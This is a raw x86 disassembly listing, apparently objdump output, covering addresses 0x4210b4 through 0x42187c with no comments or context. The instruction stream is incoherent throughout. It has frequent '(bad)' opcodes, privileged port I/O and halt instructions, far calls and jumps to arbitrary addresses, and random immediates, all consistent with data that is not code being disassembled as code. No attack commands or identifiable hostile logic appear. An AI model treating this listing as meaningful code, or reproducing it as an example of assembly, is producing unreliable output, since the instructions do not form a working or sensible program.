  4210b4:	mov    dl,0x86
  4210b6:	jg     0x4210f2
  4210b8:	cmp    BYTE PTR [edi-0x72cb3df4],ch
  4210be:	xchg   edx,eax
  4210bf:	mov    al,0x8e
  4210c1:	mov    DWORD PTR [eax],esi
  4210c3:	add    DWORD PTR [ecx+0x33e15acf],ecx
  4210c9:	scas   eax,DWORD PTR es:[edi]
  4210ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210cb:	jmp    0x421080
  4210cd:	pop    esp
  4210ce:	imul   esi,DWORD PTR [edx+0x392b7baf],0x60f73965
  4210d8:	push   edx
  4210d9:	pop    ss
  4210da:	out    dx,eax
  4210db:	js     0x42109d
  4210dd:	scas   eax,DWORD PTR es:[edi]
  4210de:	add    eax,0xf6c60c00
  4210e3:	jnp    0x4210ce
  4210e5:	mov    eax,ds:0x457afcb6
  4210ea:	(bad)  [esi]
  4210ec:	hlt    
  4210ed:	lods   al,BYTE PTR ds:[esi]
  4210ee:	(bad)  
  4210ef:	jmp    0xb691111b
  4210f4:	mov    bh,0xaa
  4210f6:	jmp    0xaa7620ae
  4210fb:	clc    
  4210fc:	cmp    DWORD PTR [ecx],edx
  4210fe:	ss enterw 0xd6f,0x2a
  421104:	popa   
  421105:	add    bl,BYTE PTR [edi-0x6f]
  421108:	mov    al,ds:0x168c789e
  42110d:	into   
  42110e:	or     BYTE PTR [ecx-0x5f],0xb8
  421112:	js     0x421175
  421114:	dec    esi
  421115:	cmp    eax,0x8213bb4b
  42111a:	sbb    BYTE PTR [edi-0x66cc461e],0x26
  421121:	loop   0x4210f5
  421123:	ins    DWORD PTR es:[edi],dx
  421124:	mov    al,ds:0x9d8c4a12
  421129:	dec    esp
  42112a:	lds    ebx,FWORD PTR [ecx]
  42112c:	jb     0x421100
  42112e:	cmp    cl,BYTE PTR [edx-0x6219b740]
  421134:	cmp    dl,BYTE PTR ds:0x3a8ec33e
  42113a:	sub    DWORD PTR [ecx-0x3be6573c],edx
  421140:	push   esi
  421141:	sar    BYTE PTR [esi],cl
  421143:	mov    bl,0x56
  421145:	(bad)  
  421146:	(bad)  
  421147:	dec    edx
  421148:	(bad)  
  421149:	cwde   
  42114a:	pop    esi
  42114b:	pop    esp
  42114c:	cli    
  42114d:	outs   dx,BYTE PTR ds:[esi]
  42114e:	cli    
  42114f:	test   BYTE PTR [edi],bl
  421151:	loope  0x421142
  421153:	into   
  421154:	sbb    ecx,DWORD PTR [ebp-0x6f]
  421157:	push   ss
  421158:	mov    dh,0xe9
  42115a:	ret    
  42115b:	cmp    eax,ecx
  42115d:	ror    DWORD PTR [edx-0x35],cl
  421160:	adc    BYTE PTR [ebx-0x3a7fc7ac],0x46
  421167:	xchg   DWORD PTR [edx-0x12],ecx
  42116a:	mov    ds:0x6976f2c8,al
  42116f:	popa   
  421170:	dec    esi
  421171:	mov    eax,ds:0x2291614b
  421176:	out    0x9,al
  421178:	or     BYTE PTR [edx],dh
  42117a:	mov    ebp,0x70956f53
  42117f:	push   esi
  421180:	sbb    BYTE PTR ss:[ebx],0xb
  421184:	sbb    eax,0x842269fc
  421189:	cmp    bh,ch
  42118b:	ret    
  42118c:	pop    ebx
  42118d:	sub    DWORD PTR [esi+esi*4],esp
  421190:	and    ecx,DWORD PTR [ebx+0x63]
  421193:	fld    TBYTE PTR [edx+0x74]
  421196:	cmp    BYTE PTR [esi-0x76],al
  421199:	out    dx,al
  42119a:	or     esp,DWORD PTR [esp+edx*4]
  42119d:	pop    ebx
  42119e:	shl    BYTE PTR [esi-0xb9bead3],cl
  4211a4:	push   esp
  4211a5:	cli    
  4211a6:	xchg   ebx,eax
  4211a7:	scas   eax,DWORD PTR es:[edi]
  4211a8:	outs   dx,DWORD PTR ds:[esi]
  4211a9:	aad    0x15
  4211ab:	(bad)  
  4211ae:	call   0x95440e71
  4211b3:	stc    
  4211b4:	sti    
  4211b5:	adc    al,0xf0
  4211b7:	dec    edx
  4211b8:	(bad)  
  4211b9:	push   eax
  4211ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211bc:	int3   
  4211bd:	imul   esp,DWORD PTR [edi],0x6ebc3a79
  4211c3:	xor    ebp,DWORD PTR [ebp+0x4a196dc]
  4211c9:	scas   al,BYTE PTR es:[edi]
  4211ca:	jae    0x42120e
  4211cc:	cwde   
  4211cd:	sub    esi,DWORD PTR [esp+edx*2]
  4211d0:	xor    dl,dl
  4211d2:	js     0x421206
  4211d4:	lods   al,BYTE PTR ds:[esi]
  4211d5:	jl     0x4211ba
  4211d7:	xlat   BYTE PTR ds:[ebx]
  4211d8:	xchg   esp,eax
  4211d9:	pop    ebx
  4211da:	js     0x421258
  4211dc:	mov    ecx,0x84ec3d82
  4211e1:	lahf   
  4211e2:	push   ebx
  4211e3:	cmp    dh,ah
  4211e5:	push   0xffffffc0
  4211e7:	shl    ebp,0xc0
  4211ea:	ins    DWORD PTR es:[edi],dx
  4211eb:	sbb    al,0x9d
  4211ed:	fsubp  st(2),st
  4211ef:	mov    eax,ds:0x425e8080
  4211f4:	sub    al,0x7d
  4211f6:	in     eax,dx
  4211f7:	gs add edx,edx
  4211fa:	iret   
  4211fb:	mov    dl,0x60
  4211fd:	jmp    0x42123b
  4211ff:	or     al,dl
  421201:	(bad)  
  421202:	sub    eax,0x14bdbc11
  421207:	push   esp
  421208:	or     edi,ebp
  42120a:	jg     0x42126a
  42120c:	jmp    0x7ac33d71
  421211:	aas    
  421212:	adc    eax,0x664a2867
  421217:	inc    esp
  421218:	adc    BYTE PTR [eax+0x1659e1f0],dl
  42121e:	push   0xaae193
  421223:	call   0xf281:0x11193a95
  42122a:	test   DWORD PTR [ebx+edx*1+0x63],edi
  42122e:	daa    
  42122f:	fild   WORD PTR [eax+0x16]
  421232:	and    eax,0x4cffb053
  421237:	ja     0x4211db
  421239:	sub    ch,BYTE PTR [ecx-0x38]
  42123c:	(bad)  
  42123e:	fmul   QWORD PTR [ebp-0x54372874]
  421244:	push   ecx
  421245:	mov    DWORD PTR [ecx],eax
  421247:	or     ebp,esi
  421249:	(bad)  
  42124a:	or     dl,dl
  42124c:	adc    ah,BYTE PTR [eax+0x45]
  42124f:	arpl   WORD PTR [edx],dx
  421251:	idiv   ecx
  421253:	aad    0x28
  421255:	jle    0x4211e4
  421257:	std    
  421258:	daa    
  421259:	cmp    DWORD PTR [edi+0x32],0x68
  42125d:	sub    dh,BYTE PTR [ebx]
  42125f:	cmp    BYTE PTR [ecx+0x7e],al
  421262:	sahf   
  421263:	or     DWORD PTR [eax-0x17d22f98],edi
  421269:	repnz sbb DWORD PTR ds:[edx],ebx
  42126d:	mov    ?,WORD PTR [ebx]
  42126f:	ret    
  421270:	imul   ebp,esp,0x8704fd74
  421276:	bound  edi,QWORD PTR es:[esi+0x7e]
  42127a:	inc    edi
  42127b:	and    edx,edx
  42127d:	mov    al,ds:0xb6d83221
  421282:	jno    0x421236
  421284:	mov    ch,0xaa
  421286:	leave  
  421287:	jb     0x42129b
  421289:	mov    BYTE PTR [edx-0x4b5e9044],bl
  42128f:	cmp    BYTE PTR [eax+0x33651080],0x4a
  421296:	pop    ecx
  421297:	stos   BYTE PTR es:[edi],al
  421298:	nop
  421299:	or     eax,0x24ca0c4a
  42129e:	adc    eax,0xd9a0453f
  4212a3:	xor    eax,0xa1d18cbb
  4212a8:	sub    al,0x99
  4212aa:	add    edi,ebx
  4212ac:	addr16 jle 0x4212bd
  4212af:	arpl   WORD PTR [esp+edx*4],ax
  4212b2:	fcom   QWORD PTR [eax-0x66]
  4212b5:	ins    BYTE PTR es:[edi],dx
  4212b6:	xchg   ecx,eax
  4212b7:	jb     0x4212a4
  4212b9:	enter  0x6992,0x17
  4212bd:	out    0xf2,eax
  4212bf:	sbb    DWORD PTR [edi+0x59],ecx
  4212c2:	test   al,0x21
  4212c4:	(bad)  
  4212c5:	fistp  QWORD PTR [ecx]
  4212c7:	mov    dh,0xc
  4212c9:	push   ecx
  4212ca:	fwait
  4212cb:	pop    eax
  4212cc:	or     al,0x8a
  4212ce:	jle    0x421308
  4212d0:	sub    dl,BYTE PTR [ecx-0x5c24f536]
  4212d6:	loopne 0x4212e3
  4212d8:	bound  esi,QWORD PTR [edi]
  4212da:	(bad)  
  4212dc:	add    edx,ecx
  4212de:	(bad)  
  4212df:	dec    esp
  4212e0:	pop    ds
  4212e1:	add    al,0xf4
  4212e3:	cwde   
  4212e4:	shl    BYTE PTR [eax+0x6a],0xb7
  4212e8:	jecxz  0x4212f8
  4212ea:	add    BYTE PTR [ebx+0x51],ch
  4212ed:	jg     0x4212de
  4212ef:	push   0xffffffb2
  4212f1:	xor    DWORD PTR [edx+edx*2-0x1e86cc3d],ebp
  4212f8:	and    al,0x1b
  4212fa:	(bad)  
  4212fb:	in     al,0xc
  4212fd:	pop    ds
  4212fe:	(bad)  
  4212ff:	aam    0xdd
  421301:	mov    ss,WORD PTR ds:0x9f69b8fa
  421307:	adc    DWORD PTR [ecx+0x50b8d303],0xffffffa8
  42130e:	fwait
  42130f:	push   esp
  421310:	xchg   esp,eax
  421311:	lea    esi,[esp+eax*2]
  421314:	stos   DWORD PTR es:[edi],eax
  421315:	(bad)  
  421316:	fist   WORD PTR [ecx+0x356ae604]
  42131c:	inc    ebp
  42131d:	mov    DWORD PTR [ebx+0x27ffa2b4],esi
  421323:	lahf   
  421324:	push   edi
  421325:	mov    bl,BYTE PTR [edx+0x348c03ed]
  42132b:	mov    al,bh
  42132d:	sahf   
  42132e:	outs   dx,DWORD PTR ds:[esi]
  42132f:	push   ds
  421330:	into   
  421331:	popa   
  421332:	sahf   
  421333:	dec    edx
  421334:	cs test al,0x6f
  421337:	rol    DWORD PTR [edx],1
  421339:	into   
  42133a:	push   edx
  42133b:	mov    eax,0x6e03154c
  421340:	test   al,0x38
  421342:	icebp  
  421343:	adc    al,BYTE PTR [ebp-0x386d254]
  421349:	sub    BYTE PTR [ecx+edx*1],bl
  42134c:	jle    0x421385
  42134e:	dec    esi
  42134f:	mov    edi,0xc658ac72
  421354:	push   0x573181a7
  421359:	retf   0xa2e8
  42135c:	sbb    eax,0x3b3f628a
  421361:	sti    
  421362:	pop    es
  421363:	mov    dl,0x6c
  421365:	xchg   edi,eax
  421366:	inc    esp
  421368:	cmp    cl,BYTE PTR [eax+edx*8+0x3f]
  42136c:	xchg   ebp,eax
  42136d:	mov    dl,0x8
  42136f:	stos   DWORD PTR es:[edi],eax
  421370:	xor    BYTE PTR [ecx],cl
  421372:	xor    BYTE PTR [ecx],bl
  421374:	xchg   esi,eax
  421375:	inc    ebx
  421376:	push   es
  421377:	pop    es
  421378:	inc    ebp
  421379:	(bad)  [ebx+0x6cd92b64]
  42137f:	or     cl,BYTE PTR [ebx+0x4ca2c454]
  421385:	stc    
  421386:	enter  0x432c,0x2d
  42138a:	(bad)  
  42138b:	mov    bl,0xb3
  42138d:	push   ecx
  42138e:	je     0x42137a
  421390:	ins    DWORD PTR es:[edi],dx
  421391:	pushf  
  421392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421394:	(bad)  
  421395:	dec    esp
  421396:	pop    esp
  421397:	div    BYTE PTR [bp+si+0x58e9]
  42139c:	mov    esp,0xf2c1a497
  4213a1:	push   ecx
  4213a2:	mov    ah,bl
  4213a4:	inc    esp
  4213a5:	xchg   esi,eax
  4213a6:	int3   
  4213a7:	(bad)  
  4213a8:	pop    DWORD PTR [ebx+0x14]
  4213ab:	je     0x421406
  4213ad:	cmp    bh,bl
  4213af:	sbb    al,0xf2
  4213b1:	xchg   esp,eax
  4213b2:	mov    bh,0x15
  4213b4:	jmp    0xf0ef:0x882a54f8
  4213bb:	sub    ch,BYTE PTR [ecx+0x65208747]
  4213c1:	test   BYTE PTR [edx-0x2a5e5996],dl
  4213c7:	push   0x62
  4213c9:	xor    al,0x15
  4213cb:	inc    edi
  4213cc:	xchg   edi,eax
  4213cd:	ret    0xb9fb
  4213d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d1:	cmp    eax,0xdfc07ab4
  4213d6:	popf   
  4213d7:	jae    0x4213e3
  4213d9:	jle    0x42140f
  4213db:	push   edi
  4213dc:	inc    ebp
  4213dd:	mov    edx,esp
  4213df:	fisub  DWORD PTR [eax+0x2d3b4ab5]
  4213e5:	jl     0x421417
  4213e7:	aam    0xc6
  4213e9:	jmp    0xe30cbe75
  4213ee:	retf   
  4213ef:	dec    edx
  4213f0:	dec    ecx
  4213f1:	outs   dx,DWORD PTR ds:[esi]
  4213f2:	add    BYTE PTR ds:[ecx-0xf415ae0],dh
  4213f9:	or     BYTE PTR [ebx],al
  4213fb:	mov    eax,0xfc3acbf
  421400:	adc    al,0x4
  421402:	hlt    
  421403:	int3   
  421404:	adc    BYTE PTR [edi+0x40c1e805],0x71
  42140b:	add    ecx,DWORD PTR [esi+0x61]
  42140e:	xchg   DWORD PTR ds:0xde20b4f9,edi
  421414:	mov    eax,0x7a515218
  421419:	mov    bl,0x15
  42141b:	mov    DWORD PTR [eax+0x6cb4d5b4],ebx
  421421:	sub    DWORD PTR [ebp+0x2d],0xe9868d19
  421428:	ret    
  421429:	(bad)  
  42142b:	push   0x7d1904e0
  421430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421431:	ror    BYTE PTR [ecx-0xe],cl
  421434:	aad    0x38
  421436:	fcomi  st,st(4)
  421438:	iret   
  421439:	bound  ebp,QWORD PTR [esi]
  42143b:	xchg   edx,eax
  42143c:	adc    bl,BYTE PTR [ebp-0x778ffcbd]
  421442:	in     eax,dx
  421443:	cmp    bl,cl
  421445:	jnp    0x4214c4
  421447:	fist   DWORD PTR [edi]
  421449:	inc    esi
  42144a:	inc    ecx
  42144b:	mov    cl,0x5
  42144d:	pop    ecx
  42144e:	push   ds
  42144f:	fmul   QWORD PTR [edi-0xb]
  421452:	lds    edi,FWORD PTR [esi+0x39]
  421455:	lea    eax,[eax+0x6076c339]
  42145b:	stos   DWORD PTR es:[edi],eax
  42145c:	mov    eax,ds:0xf2685940
  421461:	cli    
  421462:	or     al,0xd9
  421464:	sub    BYTE PTR [eax],0xbd
  421467:	les    eax,FWORD PTR [edi+0x48]
  42146a:	retf   0x8eb5
  42146d:	aad    0x54
  42146f:	and    edi,eax
  421471:	mov    ds,WORD PTR [ebx]
  421473:	ror    BYTE PTR [eax],0x2d
  421476:	jbe    0x4213fb
  421478:	xor    ah,BYTE PTR [edx]
  42147a:	mov    ah,0x7f
  42147c:	dec    eax
  42147d:	cwde   
  42147e:	inc    eax
  42147f:	and    BYTE PTR [ecx+0x10],cl
  421482:	jno    0x421454
  421484:	ins    BYTE PTR es:[edi],dx
  421485:	push   ebp
  421486:	(bad)  
  421488:	je     0x4214c1
  42148a:	ins    BYTE PTR es:[edi],dx
  42148b:	pop    ecx
  42148c:	scas   eax,DWORD PTR es:[edi]
  42148d:	popa   
  42148e:	rcr    ebp,cl
  421490:	mov    ds:0x2a73443c,al
  421495:	jmp    0x49ef5f64
  42149a:	mov    edi,0x951886bf
  42149f:	cmp    dl,BYTE PTR [eax+0xc1e234e]
  4214a5:	shr    ebp,cl
  4214a7:	arpl   bx,di
  4214a9:	repz and DWORD PTR ds:0xd8e2777e,ecx
  4214b0:	mov    BYTE PTR [edx+0x16],cl
  4214b3:	jb     0x42147c
  4214b5:	hlt    
  4214b6:	popa   
  4214b7:	ins    BYTE PTR es:[edi],dx
  4214b8:	int    0xe5
  4214ba:	adc    BYTE PTR [ebx+0x27],cl
  4214bd:	xor    BYTE PTR [ecx],bh
  4214bf:	mov    bl,0x7
  4214c1:	or     esp,ecx
  4214c3:	or     al,0x5c
  4214c5:	mov    edx,0xa812c3a2
  4214ca:	dec    edx
  4214cb:	push   esi
  4214cc:	jnp    0x421504
  4214ce:	imul   edx,eax,0xb383b276
  4214d4:	leave  
  4214d5:	dec    edx
  4214d6:	inc    ebp
  4214d7:	fimul  WORD PTR [ebp-0x7e]
  4214da:	mov    esp,esp
  4214dc:	and    ecx,DWORD PTR [eax]
  4214de:	rcl    DWORD PTR [edi],cl
  4214e0:	jp     0x4214e4
  4214e2:	lea    eax,[eax+eax*4+0x65]
  4214e6:	sahf   
  4214e7:	mov    bh,0x25
  4214e9:	xchg   DWORD PTR ds:0xd05d2d70,eax
  4214ef:	jmp    0x4214eb
  4214f1:	jge    0x4214db
  4214f3:	pop    ebp
  4214f4:	shr    BYTE PTR ds:0xc059a000,cl
  4214fa:	scas   eax,DWORD PTR es:[edi]
  4214fb:	add    eax,0x272e0c00
  421500:	cmc    
  421501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421502:	xchg   ebp,eax
  421503:	retf   0x4fd2
  421506:	fmulp  st(6),st
  421508:	push   cs
  421509:	jge    0x421511
  42150b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42150c:	gs pushf 
  42150e:	lods   eax,DWORD PTR ds:[esi]
  42150f:	adc    bh,dh
  421511:	fnstcw WORD PTR [eax+0x5c]
  421514:	addr16 adc ecx,esp
  421517:	jp     0x421562
  421519:	stc    
  42151a:	or     DWORD PTR [edi-0x65],0xef74638c
  421521:	and    BYTE PTR [edx-0x7dde80ca],0x2a
  421528:	cmp    DWORD PTR [ebx],0x77fe34a9
  42152e:	mov    ebp,DWORD PTR ss:[edx]
  421531:	sub    eax,0x908d9e5a
  421536:	push   0xab01f137
  42153b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42153c:	test   BYTE PTR [ebx-0x62],cl
  42153f:	and    edi,DWORD PTR [esi+0x50]
  421542:	lea    eax,[edx-0x1c09e350]
  421548:	shl    cl,cl
  42154a:	and    DWORD PTR [esi+edx*2+0x19f3488a],esi
  421551:	mov    edi,0xb1fcf508
  421556:	add    al,0x3b
  421558:	lds    esp,FWORD PTR [ecx-0x63b59631]
  42155e:	cmp    al,0x5
  421560:	dec    esi
  421561:	add    cl,BYTE PTR [eax+0x7c]
  421564:	cld    
  421565:	lods   al,BYTE PTR ds:[esi]
  421566:	ret    0x3cdf
  421569:	popf   
  42156a:	sbb    eax,0x12e2f377
  42156f:	sahf   
  421570:	dec    edi
  421571:	or     edi,DWORD PTR [ecx+eax*8]
  421574:	ror    bl,cl
  421576:	adc    al,0xdf
  421578:	iret   
  421579:	or     DWORD PTR [esi],esi
  42157b:	mov    ebx,0x88441993
  421580:	loop   0x421589
  421582:	jmp    0x9855452e
  421587:	ss leave 
  421589:	xor    al,0xf
  42158b:	imul   esp,DWORD PTR [ebx+0x3ca99044],0x5296cd05
  421595:	mov    ds:0x2b6f253c,al
  42159a:	jge    0x421555
  42159c:	mov    edx,0x4235e664
  4215a1:	mov    ah,0x2e
  4215a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215a4:	mov    al,0x49
  4215a6:	pop    edx
  4215a7:	jp     0x42159a
  4215a9:	out    dx,eax
  4215aa:	jmp    0x2b98e1bd
  4215af:	sbb    BYTE PTR [ecx+0x47],ah
  4215b2:	outs   dx,BYTE PTR ds:[esi]
  4215b3:	or     DWORD PTR [eax],edx
  4215b5:	jl     0x4215d3
  4215b7:	pop    ds
  4215b8:	cmp    ecx,DWORD PTR [edx+eiz*2+0x16]
  4215bc:	sbb    al,0xe5
  4215be:	cmp    DWORD PTR [esi],0x35
  4215c1:	bound  esp,QWORD PTR [edx+0x67]
  4215c4:	sub    eax,DWORD PTR [ecx+ecx*2-0x3aa2352e]
  4215cb:	adc    ch,BYTE PTR [ecx]
  4215cd:	test   al,0x8b
  4215cf:	mov    eax,ebx
  4215d1:	pop    ebp
  4215d2:	and    al,0xaa
  4215d4:	je     0x421629
  4215d6:	xchg   edx,eax
  4215d7:	inc    ecx
  4215d8:	in     al,dx
  4215d9:	daa    
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	pop    ds
  4215dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215dd:	jmp    0x421631
  4215df:	and    eax,0x8e045a84
  4215e4:	in     eax,0x96
  4215e6:	aad    0x1b
  4215e8:	inc    edi
  4215e9:	mov    DWORD PTR [ecx+ebp*8+0x14f0361b],eax
  4215f0:	jg     0x42160d
  4215f2:	jnp    0x4215cc
  4215f4:	cs push cs
  4215f6:	sub    DWORD PTR [ecx-0x62],ebp
  4215f9:	out    dx,eax
  4215fa:	aad    0xea
  4215fc:	cmp    edi,DWORD PTR [edx+0x2544a749]
  421602:	push   0x6aa98f2a
  421607:	or     eax,DWORD PTR [edi-0x5aeaf72]
  42160d:	add    BYTE PTR [eax],ah
  42160f:	xor    eax,ebp
  421611:	call   0xc04e:0x75d94a42
  421618:	xchg   DWORD PTR [edx],eax
  42161a:	add    BYTE PTR [esi+0x10],bl
  42161d:	lock out 0x11,al
  421620:	lock mov es,WORD PTR ds:0x190071e8
  421627:	in     al,0x7d
  421629:	push   es
  42162a:	shl    ecx,1
  42162c:	xchg   edi,eax
  42162d:	sbb    edx,edx
  42162f:	fmul   DWORD PTR [ebp-0x55]
  421632:	jnp    0x4215b4
  421634:	int3   
  421635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421636:	push   ebp
  421637:	mov    dh,0x70
  421639:	jge    0x4215ee
  42163b:	aaa    
  42163c:	aas    
  42163d:	outs   dx,DWORD PTR ds:[esi]
  42163e:	push   es
  42163f:	and    esi,esp
  421641:	fwait
  421642:	jmp    0xb4cdec09
  421647:	mov    ah,0xe2
  421649:	out    dx,al
  42164a:	mov    eax,0x63a0a8b0
  42164f:	mov    dl,0x6a
  421651:	mov    al,0xd5
  421653:	rol    bh,0x62
  421656:	push   cs
  421657:	push   edx
  421658:	sub    eax,0xee2a2832
  42165d:	cmp    al,0x15
  42165f:	gs pand mm7,mm4
  421663:	mov    eax,DWORD PTR [ecx-0x1b498578]
  421669:	pop    ebp
  42166a:	push   0x292f4618
  42166f:	daa    
  421670:	dec    DWORD PTR [esi+0x6a5d24b0]
  421676:	dec    edi
  421677:	xchg   ecx,eax
  421678:	jge    0x4216a0
  42167a:	cs xchg ecx,eax
  42167c:	inc    ebx
  42167d:	out    0x60,al
  42167f:	jne    0x4216ae
  421681:	push   ebp
  421682:	rcl    BYTE PTR [edx],cl
  421684:	pop    ebp
  421685:	cmp    eax,0x50f3db3f
  42168a:	lods   eax,DWORD PTR ds:[esi]
  42168b:	ret    0x97b6
  42168e:	shr    BYTE PTR [ebp-0x57f222e0],0xa9
  421695:	pop    ebp
  421696:	stos   BYTE PTR es:[edi],al
  421697:	daa    
  421698:	sahf   
  421699:	int    0xbf
  42169b:	xchg   edi,eax
  42169c:	dec    edx
  42169d:	xchg   ch,ah
  42169f:	dec    eax
  4216a0:	nop
  4216a1:	ins    BYTE PTR es:[edi],dx
  4216a2:	xchg   edx,eax
  4216a3:	and    bl,dl
  4216a5:	lods   al,BYTE PTR ds:[esi]
  4216a6:	stos   DWORD PTR es:[edi],eax
  4216a7:	shr    BYTE PTR [eax+ebx*1-0x77e448bf],0xc1
  4216af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216b0:	iret   
  4216b1:	das    
  4216b2:	loopne 0x421706
  4216b4:	out    0xbd,al
  4216b6:	shrd   esp,ecx,cl
  4216b9:	stos   DWORD PTR es:[edi],eax
  4216ba:	aad    0x9f
  4216bc:	arpl   WORD PTR [ebx],bx
  4216be:	es enter 0x1d04,0xba
  4216c3:	xor    DWORD PTR [ecx-0x54],esp
  4216c6:	adc    al,0xb
  4216c8:	mov    cl,bl
  4216ca:	pop    ebp
  4216cb:	je     0x42169f
  4216cd:	cmp    DWORD PTR [esi+0x6b],ebx
  4216d0:	and    bl,BYTE PTR [esi+0x29]
  4216d3:	shl    ch,cl
  4216d5:	stos   DWORD PTR es:[edi],eax
  4216d6:	sub    BYTE PTR [ebx+0x38],al
  4216d9:	inc    esi
  4216da:	(bad)  [eax]
  4216dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216dd:	adc    ch,BYTE PTR [edx]
  4216df:	mov    edx,0xf7fd0050
  4216e4:	call   0xbe11:0xb40021d
  4216eb:	sahf   
  4216ec:	loopne 0x4216d9
  4216ee:	(bad)  [ebx+0x19]
  4216f1:	sbb    al,0xe8
  4216f3:	sbb    cl,al
  4216f5:	icebp  
  4216f6:	aaa    
  4216f7:	dec    edi
  4216f8:	and    bl,ch
  4216fa:	or     DWORD PTR [eax+0x49226d21],esi
  421700:	dec    ebx
  421701:	(bad)  
  421703:	push   0x1b
  421705:	fbld   TBYTE PTR [esi+0x4dc926bf]
  42170b:	gs cmp al,0x40
  42170e:	addr16 jbe 0x421703
  421711:	mov    edx,0x2fb50f01
  421716:	pop    ds
  421717:	ss add al,dh
  42171a:	cs jmp 0x4216f2
  42171d:	jae    0x4216e3
  42171f:	inc    edx
  421720:	sti    
  421721:	std    
  421722:	hlt    
  421723:	xchg   ebp,eax
  421724:	jg     0x4216f5
  421726:	stos   BYTE PTR es:[edi],al
  421727:	loop   0x42173d
  421729:	mov    ecx,esp
  42172b:	dec    eax
  42172c:	mov    ecx,0x85358178
  421731:	es xchg ecx,eax
  421733:	xor    al,0xc0
  421735:	into   
  421736:	sub    ecx,edx
  421738:	(bad)  
  421739:	jnp    0x42172c
  42173b:	out    0x18,al
  42173d:	sahf   
  42173e:	xchg   ebx,eax
  42173f:	outs   dx,DWORD PTR ds:[esi]
  421740:	jecxz  0x421796
  421742:	cli    
  421743:	dec    ecx
  421744:	imul   ebx,DWORD PTR [edx-0x80],0x8fc12c3d
  42174b:	es aaa 
  42174d:	pusha  
  42174e:	aaa    
  42174f:	cmp    esi,DWORD PTR [ebp-0x2a5494a8]
  421755:	jge    0x421788
  421757:	shl    ch,cl
  421759:	div    DWORD PTR [edi+0x3a]
  42175c:	stos   BYTE PTR es:[edi],al
  42175d:	mov    dl,0xf1
  42175f:	jle    0x4217a4
  421761:	cld    
  421762:	popa   
  421763:	sub    BYTE PTR [ecx+ebp*4+0x68db1c4c],cl
  42176a:	or     eax,0x70942e4e
  42176f:	mov    ecx,0x6225c944
  421774:	cwde   
  421775:	outs   dx,DWORD PTR ds:[esi]
  421776:	xor    al,0x91
  421778:	fs daa 
  42177a:	dec    eax
  42177b:	call   0xe3b0:0x41163728
  421782:	sub    bh,BYTE PTR [edx+0x5d8d8327]
  421788:	cli    
  421789:	xchg   edx,eax
  42178a:	(bad)  
  42178b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42178c:	nop
  42178d:	dec    esp
  42178e:	sub    al,0x17
  421790:	dec    ecx
  421791:	jmp    FWORD PTR ds:0x2760cf96
  421797:	mov    ecx,0x1460bbf8
  42179c:	mov    ds:0x9b421b9,eax
  4217a1:	adc    bh,BYTE PTR [ecx+0x76]
  4217a4:	mov    esp,0x3a4a1045
  4217a9:	mov    ebp,0xb2baf3f8
  4217ae:	add    al,0xb4
  4217b0:	sbb    ah,dh
  4217b2:	or     eax,0x88a8b253
  4217b7:	cmp    BYTE PTR [ecx+ebx*4-0x41cbd536],0x4c
  4217bf:	popa   
  4217c0:	xchg   ebp,eax
  4217c1:	adc    eax,edi
  4217c3:	adc    BYTE PTR [ebp-0x611830c3],dl
  4217c9:	and    bl,BYTE PTR [ecx]
  4217cb:	push   0x94840dc2
  4217d0:	aas    
  4217d1:	jmp    0x421835
  4217d3:	xchg   edx,eax
  4217d4:	iret   
  4217d5:	xchg   esp,eax
  4217d6:	and    al,0x99
  4217d8:	or     edi,DWORD PTR [edi+ebx*8+0x62ab2fb8]
  4217df:	fstp   QWORD PTR [ebx-0x3f]
  4217e2:	push   cs
  4217e3:	or     BYTE PTR es:[edi+eax*4],dh
  4217e7:	sub    edx,DWORD PTR ds:0xf027886c
  4217ed:	aam    0x56
  4217ef:	add    DWORD PTR [edi-0x77],esi
  4217f2:	das    
  4217f3:	jmp    0x697394c2
  4217f8:	fs enter 0xc1c5,0x56
  4217fd:	cmp    BYTE PTR [esi-0x45aeef8e],0xc
  421804:	adc    cl,BYTE PTR [ebx+0x1e]
  421807:	mov    WORD PTR [ecx-0x3fd23102],ss
  42180d:	(bad)  
  42180e:	retf   
  42180f:	and    BYTE PTR [edx+0x0],0x1f
  421813:	sbb    ebx,ebp
  421815:	loop   0x4217d2
  421817:	push   esp
  421818:	mov    WORD PTR [edi+0x6c5437ce],gs
  42181e:	shl    BYTE PTR [esi],0xfa
  421821:	xchg   edi,eax
  421822:	pop    ds
  421823:	int    0x96
  421825:	xor    cl,dl
  421827:	scas   al,BYTE PTR es:[edi]
  421828:	bound  edi,QWORD PTR [edx+0x17]
  42182b:	sub    ah,cl
  42182d:	cmp    eax,0xc129d000
  421832:	test   BYTE PTR ds:0xf0003d95,ch
  421838:	jo     0x421892
  42183a:	or     eax,0xacd3f32f
  42183f:	iret   
  421840:	cmp    esp,DWORD PTR [ebx]
  421842:	and    BYTE PTR [eax],al
  421844:	and    BYTE PTR [esi-0x40],ch
  421847:	stc    
  421848:	adc    al,0xa
  42184a:	fistp  WORD PTR [eax+0x18]
  42184d:	xchg   edi,eax
  42184e:	jbe    0x421893
  421850:	enter  0x58cb,0x46
  421854:	ffree  st(1)
  421856:	in     eax,dx
  421857:	jne    0x4218a4
  421859:	inc    ebp
  42185a:	pop    ecx
  42185b:	xchg   BYTE PTR [edi+edi*1],cl
  42185e:	(bad)
  421863:	mov    eax,0x90ea9508
  421868:	ror    DWORD PTR [ebx],cl
  42186a:	in     eax,0x9d
  42186c:	nop
  42186d:	call   0xd580d67f
  421872:	imul   esp,eax,0x9c8b84e2
  421878:	in     al,0xf2
  42187a:	sub    edi,ebx
  42187c:	jmp    0x27da3297
